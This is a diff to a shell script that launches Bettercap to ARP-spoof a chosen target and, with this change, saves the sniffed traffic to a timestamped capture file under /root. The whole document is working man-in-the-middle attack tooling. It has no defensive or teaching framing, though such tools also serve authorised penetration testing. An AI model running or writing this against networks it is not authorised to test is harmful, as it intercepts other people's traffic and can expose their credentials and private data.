@@ -55,9 +55,16 @@ echo
 echo "[*] Interface : $IFACE"
 echo "[*] Target    : $TARGET"
 echo "[*] Caplet    : $CAPLET"
+
+# Timestamped capture file
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+CAPTURE="/root/Vibe_Coded_Scripts/HaxVibez/capture_${TIMESTAMP}.cap"
+echo "[*] Capture   : $CAPTURE"
 echo
 echo "[*] Starting Bettercap..."
 echo "[*] Type 'exit' or Ctrl+C to stop."
 echo
 
-bettercap -iface "$IFACE" -eval "set arp.spoof.targets $TARGET" -caplet "$CAPLET"
+bettercap -iface "$IFACE" \
+  -eval "set arp.spoof.targets $TARGET; set net.sniff.output $CAPTURE" \
+  -caplet "$CAPLET"
